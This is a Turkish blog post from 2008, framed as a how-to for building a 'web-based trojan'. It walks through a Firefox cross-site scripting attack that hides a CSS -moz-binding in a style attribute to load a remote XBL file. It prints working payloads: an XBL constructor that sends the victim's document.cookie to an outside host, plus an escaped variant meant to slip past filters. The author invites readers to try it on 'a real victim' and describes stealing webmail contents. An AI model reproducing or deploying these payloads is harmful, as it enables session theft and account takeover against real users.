---
title: Web tabanlı truva atı (trojan) nasıl yapılır?
desc:
image:
date: "2008-05-11T07:00:00.000Z"
path: "/journal/web-tabanli-truva-ati-trojan-nasil-yapilir"
---

XSS ve web guvenligi meraklilari icin birkac teknikten bahsetmeye karar verdim.Bunlardan ilki oldukca gecerli olan ve pek az bilinen, firefox'ta calisan moz-binding yontemi.Yaziyi "vuralim, kiralim" uslubuyla yazdim ancak amacim sadece guvenlik onlemleri icin kaynak olusturmak.

Gecen yil Hakan (Bilgin) cloudo icin, bense r(ainbow)92 icin kod renklendirme yapmaya calisiyorduk. Hakan o zamanlar hazirladigi bir ornekte, XBL/-moz-binding teknigini kullanarak uygulamaya CSS kodu icinden XML import ediyor, XML'in icinden de javascript calistiriyordu.Bu bana oldukca ilginc gelmis ve -moz-binding ile tanismami saglamisti.

Eger bu ilginc teknigi, Yahoo UI gelistiricisi Douglas Crockford'un JSON'u kesfetmesini saglayan script include yontemiyle birlestirirseniz (bu yontem hem data transferlerini hem de client'ta istediginiz manyakligi yapmanizi saglar), yapabilecekleriniz hayal gucunuz kadar sinirsizdir. Ornegin maillerine hotmail,gmail vb web uzerinden ulasan bir kullanicinin tum maillerini cekebilir veya habersizce istediginiz maili yazdirtip gondertebilirsiniz.

Her iki yontemin de nasil kullanildigini anlamak icin kullanicilarin cookie'lerini victim list'e kaydetmeyi amacladigimiz kucuk bir ornek yapalim, ornegi denemek icin basit bir uygulama taslagi hazirlayabilirsiniz veya gercek bir kurban secebilirsiniz..

Sectigimiz web uygulamasi kullanicilarin sadece `<strong>` vb masum gorunen html tag'lerine izin veriyor olsun.Eger bu uygulama attribute'leri kontrol etmiyorsa isimiz kolay, onload vb event'lerle direk javascript calistirabiliriz.Eger kontrol ediyorsa, style attribute'una izin verilip verilmediginden emin olun. WYSIWYG editorlerinden veri bekleyen uygulamalarin hepsinde izin verilir.

Amacimiz style attribute'u icinde -moz-binding kullanarak xbl belgesini cagirmak. Bundan evvel javascript calistiracagimiz XBL belgesini hazirlayip kurbanlarin erisebilecegi bir yere yukleyelim:

```
<?xml version="1.0"?>
<bindings xmlns="http://www.mozilla.org/xbl" xmlns:html="http://www.w3.org/1999/xhtml">

<binding id="xss">
<implementation>
<constructor>
document.body.appendChild(document.createElement("script")).setAttribute("src","http://victim.com/?append="+escape(document.cookie));
</constructor>
</implementation>
</binding>

</bindings>
```

```
style='color:red; -moz-binding:url("http://victim.com/xbl.xml#xss");'
```

Cok az bir ihtimalle kurbaniniz moz-binding yazilmasini veya cross domain veri cagrilmasini blocklamis olabilir. Bu durumda b planimiz [the-spanner.co.uk](http://thespanner.co.uk) adresinde yayinlanan bir snippet'tan geliyor:

```
/style=\-\mo\z-b\i\nd\in\g:\url(//victim.com\/xbl_log\.xml\#xss)
```

Bundan sonrasi javascript bilginize kalmis. Kullanicinin arayuzunde daha cesitli tuneller acabilir, arayuzu degistirebilir veya kullanici adina islemler yapabilirsiniz.
